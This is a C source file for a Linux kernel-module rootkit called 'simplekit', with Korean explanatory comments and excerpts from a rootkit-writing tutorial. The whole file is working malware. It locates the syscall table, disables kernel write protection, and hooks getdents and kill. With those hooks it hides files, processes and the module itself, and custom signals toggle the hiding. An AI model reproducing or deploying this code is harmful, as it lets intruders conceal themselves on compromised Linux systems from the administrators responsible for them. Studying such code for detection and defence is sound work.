#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>

#include "simplekit.h"

unsigned long cr0;
static unsigned long *sys_call_table;
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
	unsigned int);
typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
	struct linux_dirent64 *, unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;

unsigned long *
get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = START_MEM; i < END_MEM; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

asmlinkage int
hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc &&
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

asmlinkage int
hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
	unsigned int count)
{
	// getdents() 함수는 읽어들인 바이트 수를 반환한다.
	int ret = orig_getdents(fd, dirent, count), err;
	unsigned short proc = 0;

	// offset을 의미
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	// kdirent(aka kernel directory entry)
	// kzalloc(aka kernel zeroed malloc)
	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	// 시스템콜 안에서는 사용자 영역에서 가져온 directory entry를
	// 직접적으로 사용하지 않고 커널 Heap 영역에 복사해서 사용한다.
	// copy_from_user() 함수는 복사하지 못한 바이트 수를 반환한다.
	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	// 목표 시스템의 커널 버전이 3.19 이하이므로 다음 방식으로 d_inode를 접근한다.
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;

	// inode가 프로세스인지 파일인지 구별
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	// 매개변수로 전달받은 파일 디스크립터(fd)로 추적해내려간
	// 데이터의 바이트 수 만큼 ret 변수는 감소한다.
	// ret 변수의 값이 off 변수보다 크지 않으면
	// 파일 디스크립터 이하 모든 inode를 탐색한 것이다.
	while (off < ret) {

		// void 포인터의 포인터 연산은 1 바이트를 단위로 한다.
		dir = (void *)kdirent + off;
		if ((!proc && // 프로세스가 아닐 때 && 숨기려는 파일일 때
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&   // 프로세스일 때      && 숨기려는 프로세스일 때
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {

			// 숨기려는 파일, 디렉토리 또는 프로세스가
			// 메모리 공간의 시작주소에 위치하면
			// 할당된 메모리 공간의 크기를 줄인다.
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			// 숨기려는 파일, 디렉토리 또는 프로세스가 차지하는 공간을
			// 이전 directory entry가 차지하는 것처럼 보이게 한다.
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	// 커널 영역에서 동적 할당한 Heap 영역을 해제
	kfree(kdirent);
	return ret;
}

// - tidy():
// When you analyse what kernel does during unloading a module you will see that
// it deletes entry in /sys/module for that module.
//
// But there's a problem - we removed that entry. So when we unload a module the
// kernel will try to remove non-existing entry. This will cause
// Oops and probably the system will crash. We must avoid it. But you can see
// that when we set some pointers to NULL, the kernel won't try
// to remove that entry. If you want to really understand this function you must
// browse linux kernel's source code on your own. Writing
// about process of loading and unloading modules could be bigger than 7
// articles like this you are currently reading ;)
//
// source: WRITING A SIMPLE ROOTKIT FOR LINUX
static inline void
tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;
void
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);

	module_hidden = 0;
}

// - rootkit_hide():
// In this function we hide the rootkit. First problem is that rootkit is
// displayed by "lsmod" command and is visible in /proc/modules file.
// To solve this problem we can delete our module from main list of modules.
// Each module is represented by module structure.
// Let's take a look at a definition of this structure:
// ...
// struct list_head list - this is the main list of modules. We have to delete
// our module from this list.
// When we do this, rootkit will no longer be visible by "lsmod" and in "/proc/
// modules".
// But our rootkit is still visible in /sys/module/ directory. /sys is also
// special filesystem(like /proc).
// Each entry in /sys is represented by kobject structure. Each module has its
// own kobject. In definition of struct module we see:
// struct module_kobject mkobj
// Let's look at definition of module_kobject structure:
//
// source: WRITING A SIMPLE ROOTKIT FOR LINUX
void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	module_hidden = 1;
}

asmlinkage int
hacked_kill(pid_t pid, int sig)
{
	struct task_struct *task;

	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
			return orig_kill(pid, sig);
	}
	return 0;
}

static inline void
protect_memory(void)
{
	// restore CR0
	write_cr0(cr0);
}

static inline void
unprotect_memory(void)
{
	// CR0[16] is Write Protect Bit
	// CR0[16] is unset to disable Write Protect
	write_cr0(cr0 & ~0x00010000);
}

// 커널 모듈을 로드할 때 수행
static int __init
simplekit_init(void)
{
	sys_call_table = get_syscall_table_bf();
	if (!sys_call_table)
		return -1;

	cr0 = read_cr0();

	module_hide();
	tidy();

	orig_getdents = (orig_getdents_t)sys_call_table[__NR_getdents];
	orig_getdents64 = (orig_getdents64_t)sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)sys_call_table[__NR_kill];

	unprotect_memory();
	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
	sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
	protect_memory();

	return 0;
}

// 커널 모듈을 해제할 때 실행
static void __exit
simplekit_cleanup(void)
{
	unprotect_memory();
	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	protect_memory();
}

module_init(simplekit_init);
module_exit(simplekit_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");
